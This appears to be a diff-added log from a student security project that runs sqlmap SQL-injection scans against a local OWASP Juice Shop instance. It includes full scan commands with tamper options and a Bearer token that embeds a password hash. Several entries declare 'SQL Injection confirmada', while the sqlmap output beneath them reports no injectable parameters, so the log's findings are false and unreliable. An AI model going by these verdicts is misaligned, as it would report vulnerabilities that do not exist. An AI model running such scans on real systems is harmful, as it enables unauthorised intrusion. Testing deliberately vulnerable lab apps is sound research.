eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em rest_search_empty
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [']     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:53 /2026-06-01/
+  
+  [00:20:53] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:53] [INFO] loading tamper module 'space2comment'
+  [00:20:53] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.96 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:53] [WARNING] provided value for parameter 'q' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+  [00:20:53] [INFO] flushing session file
+  [00:20:53] [INFO] testing connection to the target URL
+  [00:20:53] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:53] [INFO] testing if the target URL content is stable
+  [00:20:54] [INFO] target URL content is stable
+  [00:20:54] [INFO] testing if GET parameter 'q' is dynamic
+  [00:20:54] [INFO] GET parameter 'q' appears to be dynamic
+  [00:20:54] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
+  [00:20:54] [INFO] testing for SQL injection on GET parameter 'q'
+  [00:20:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:20:54] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:20:54] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:20:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:20:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:20:54] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:20:54] [INFO] testing 'Generic inline queries'
+  [00:20:54] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:20:55] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:20:55] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:20:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:20:55] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:20:55] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:20:55] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:20:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:20:55] [WARNING] GET parameter 'q' does not seem to be injectable
+  [00:20:55] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:20:55] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 32 times
+  
+  [*] ending @ 00:20:55 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[15/41] Testando: api_feedbacks_list
+  Método:    GET
+  Path:      /api/Feedbacks
+  Descrição: Listar feedbacks
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Feedbacks" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_feedbacks_list
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___["]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [']     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:56 /2026-06-01/
+  
+  [00:20:56] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:56] [INFO] loading tamper module 'space2comment'
+  [00:20:56] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:56] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:20:56] [INFO] flushing session file
+  [00:20:56] [INFO] testing connection to the target URL
+  [00:20:56] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:56] [INFO] testing if the target URL content is stable
+  [00:20:57] [INFO] target URL content is stable
+  [00:20:57] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:20:57] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:20:57] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:20:57] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:20:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:20:57] [WARNING] reflective value(s) found and filtering out
+  [00:20:57] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:20:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:20:57] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:20:57] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:20:57] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:20:57] [INFO] testing 'Generic inline queries'
+  [00:20:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:20:57] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:20:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:20:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:20:57] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:20:58] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:20:58] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:20:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:20:58] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:20:58] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:20:58] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 73 times
+  
+  [*] ending @ 00:20:58 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[16/41] Testando: api_feedbacks_get_by_id
+  Método:    GET
+  Path:      /api/Feedbacks/1
+  Descrição: Obter feedback por ID
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Feedbacks/1" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_feedbacks_get_by_id
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___["]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [,]     | .'| . |
+  |___|_  [(]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:58 /2026-06-01/
+  
+  [00:20:58] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:58] [INFO] loading tamper module 'space2comment'
+  [00:20:58] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:59] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:20:59] [INFO] flushing session file
+  [00:20:59] [INFO] testing connection to the target URL
+  [00:20:59] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:59] [INFO] testing if the target URL content is stable
+  [00:20:59] [INFO] target URL content is stable
+  [00:20:59] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:20:59] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:20:59] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:20:59] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:20:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:20:59] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:20:59] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:00] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:00] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:00] [INFO] testing 'Generic inline queries'
+  [00:21:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:00] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:00] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:00] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:00] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:00] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:01] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:01] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:01] [WARNING] HTTP error codes detected during run:
+  404 (Not Found) - 73 times
+  
+  [*] ending @ 00:21:01 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[17/41] Testando: api_feedbacks_create
+  Método:    POST
+  Path:      /api/Feedbacks
+  Descrição: Criar feedback
+  Auth:      Sim (Bearer JWT)
+  Body:      {"UserId": 1, "comment": "Test feedback sqlmap", "rating": 3, "captchaId": 0, "captcha": "0"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Feedbacks" --method=POST --data='{"UserId": 1, "comment": "Test feedback sqlmap", "rating": 3, "captchaId": 0, "captcha": "0"}' --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4\nContent-Type: application/json"
+
+  [?] Resultado inconclusivo para api_feedbacks_create
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[']_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:01 /2026-06-01/
+  
+  [00:21:01] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:01] [INFO] loading tamper module 'space2comment'
+  [00:21:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:02] [INFO] flushing session file
+  [00:21:02] [INFO] testing connection to the target URL
+  [00:21:02] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:21:02] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:02] [INFO] testing if the target URL content is stable
+  [00:21:02] [INFO] target URL content is stable
+  [00:21:02] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:21:02] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 3 times
+  
+  [*] ending @ 00:21:02 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[18/41] Testando: api_complaints_list
+  Método:    GET
+  Path:      /api/Complaints
+  Descrição: Listar reclamações
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Complaints" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_complaints_list
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___["]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [.]     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:03 /2026-06-01/
+  
+  [00:21:03] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:03] [INFO] loading tamper module 'space2comment'
+  [00:21:03] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:03] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:03] [INFO] flushing session file
+  [00:21:03] [INFO] testing connection to the target URL
+  [00:21:03] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:03] [INFO] testing if the target URL content is stable
+  [00:21:04] [INFO] target URL content is stable
+  [00:21:04] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:04] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:04] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:04] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:04] [WARNING] reflective value(s) found and filtering out
+  [00:21:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:04] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:04] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:04] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:04] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:04] [INFO] testing 'Generic inline queries'
+  [00:21:04] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:04] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:04] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:04] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:05] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:05] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:05] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:05] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:05] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 73 times
+  
+  [*] ending @ 00:21:05 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[19/41] Testando: api_complaints_get_by_id
+  Método:    GET
+  Path:      /api/Complaints/1
+  Descrição: Obter reclamação por ID
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Complaints/1" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [?] Resultado inconclusivo para api_complaints_get_by_id
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [.]     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:05 /2026-06-01/
+  
